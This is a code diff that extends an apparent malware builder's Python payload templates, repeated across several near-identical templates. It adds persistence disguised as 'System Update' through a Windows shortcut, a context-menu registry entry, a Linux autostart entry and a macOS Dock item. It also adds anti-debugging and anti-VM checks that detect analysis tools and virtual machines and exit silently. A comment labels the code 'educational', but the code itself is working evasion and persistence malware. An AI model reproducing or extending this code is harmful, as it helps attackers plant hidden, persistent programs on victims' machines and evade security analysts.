 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -2342,6 +2846,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -2448,6 +2981,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -2520,10 +3072,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -2536,6 +3164,11 @@ def execute_payload():
     time.sleep(2)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -2565,11 +3198,19 @@ import platform
 import subprocess
 import os
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -2633,6 +3274,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -2739,6 +3409,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -2811,10 +3500,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -2822,6 +3587,11 @@ def execute_payload():
     time.sleep(2)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -2849,11 +3619,19 @@ import os
 import sys
 import subprocess
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -2917,6 +3695,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -3023,6 +3830,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -3095,10 +3921,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -3107,6 +4009,11 @@ def execute_payload():
     time.sleep(2)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -3136,11 +4043,19 @@ import platform
 import subprocess
 import os
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -3204,6 +4119,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -3310,6 +4254,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -3382,10 +4345,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -3395,6 +4434,11 @@ def execute_payload():
     time.sleep(2)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -3423,11 +4467,19 @@ import platform
 import subprocess
 import os
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -3491,6 +4543,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
@@ -3597,6 +4678,25 @@ exit \$RETVAL
                     f.write(f"#!/bin/bash\n{exe_path} &\n")
                 os.chmod(profile_path, 0o755)
                 
+            elif PERSISTENCE_METHOD == "desktop_shortcut":
+                # Create .desktop file
+                desktop_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(desktop_dir):
+                    os.makedirs(desktop_dir)
+                    
+                desktop_file = os.path.join(desktop_dir, "system-update.desktop")
+                if not os.path.exists(desktop_file):
+                    with open(desktop_file, "w") as f:
+                        f.write(f"""[Desktop Entry]
+Type=Application
+Name=System Update
+Exec={exe_path}
+Icon=system-software-update
+Terminal=false
+Categories=System;
+""")
+                    os.chmod(desktop_file, 0o755)
+                
         elif system == "Darwin":  # macOS
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
@@ -3669,10 +4769,86 @@ end tell
                 
                 subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                 os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "dock_shortcut":
+                # Add to Dock
+                dock_script = f'''
+tell application "System Events"
+    tell dock preferences
+        make new dock item at end with properties {{path:"{exe_path}", kind:file}}
+    end tell
+end tell
+'''
+                subprocess.run(["osascript", "-e", dock_script], check=False)
             
     except Exception as e:
         # Silently handle errors in educational context
         pass
+
+def anti_debug_check():
+    """Check for debugging environment"""
+    if not ANTI_DEBUG_ENABLED:
+        return False
+        
+    try:
+        # Check for common debuggers
+        debuggers = ['gdb', 'lldb', 'strace', 'ltrace', 'x64dbg', 'ida', 'ollydbg']
+        for debugger in debuggers:
+            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
+                return True
+                
+        # Check for debugging flags
+        if hasattr(sys, 'gettrace') and sys.gettrace():
+            return True
+            
+        # Timing check
+        start = time.time()
+        time.sleep(0.1)
+        end = time.time()
+        if (end - start) > 0.15:
+            return True
+            
+        return False
+    except:
+        return False
+
+def anti_vm_check():
+    """Check for virtualization environment"""
+    if not ANTI_VM_ENABLED:
+        return False
+        
+    try:
+        vm_indicators = [
+            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
+            '/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor'
+        ]
+        
+        for indicator in vm_indicators:
+            if os.path.exists(indicator):
+                with open(indicator, 'r') as f:
+                    content = f.read().lower()
+                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels']):
+                        return True
+        
+        # Check MAC address
+        try:
+            import uuid
+            mac = uuid.getnode()
+            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
+            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56', '00:05:69', '00:03:ff')):
+                return True
+        except:
+            pass
+        
+        # Check for common VM processes
+        vm_processes = ['vboxservice', 'vmtoolsd', 'vmware', 'vmware-user', 'prl_cc', 'prl_tools']
+        for process in vm_processes:
+            if os.system(f'pgrep -f {process} > /dev/null 2>&1') == 0:
+                return True
+        
+        return False
+    except:
+        return False
 
 def execute_payload():
     setup_persistence()
@@ -3681,6 +4857,11 @@ def execute_payload():
     time.sleep(2)
 
 def main():
+    # Anti-analysis checks
+    if anti_debug_check() or anti_vm_check():
+        # Exit silently if detected
+        sys.exit(0)
+    
     if FAKE_GUI:
         t = threading.Thread(target=execute_payload)
         t.daemon = True
@@ -3709,11 +4890,19 @@ import sys
 import platform
 import subprocess
 import threading
+import base64
+import tempfile
+import shutil
 
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
 PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
+AUTO_LAUNCH_METHOD = "$AUTO_LAUNCH_METHOD"
+
+# Anti-detection
+ANTI_DEBUG_ENABLED = $ANTI_DEBUG_ENABLED
+ANTI_VM_ENABLED = $ANTI_VM_ENABLED
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -3777,6 +4966,35 @@ def setup_persistence():
                 # Create scheduled task
                 task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                 subprocess.run(task_cmd, shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "lnk_file":
+                # Create LNK file on desktop
+                import pythoncom
+                from win32com.shell import shell, shellcon
+                
+                desktop = shell.SHGetFolderPath(0, shellcon.CSIDL_DESKTOP, None, 0)
+                shortcut_path = os.path.join(desktop, "System Update.lnk")
+                
+                if not os.path.exists(shortcut_path):
+                    shortcut = pythoncom.CoCreateInstance(
+                        shell.CLSID_ShellLink, None,
+                        pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
+                    )
+                    shortcut.SetPath(exe_path)
+                    shortcut.SetDescription("System Update")
+                    shortcut.SetWorkingDirectory(os.path.dirname(exe_path))
+                    
+                    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
+                    persist_file.Save(shortcut_path, 0)
+            
+            elif PERSISTENCE_METHOD == "shell_extension":
+                # Add to right-click context menu
+                reg_path = "Software\\Classes\\*\\shell\\SystemUpdate"
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "System Update")
+                    
+                with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"{reg_path}\\command") as key:
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}" "%1"')
                 
         elif system == "Linux":
             # Get current executable path
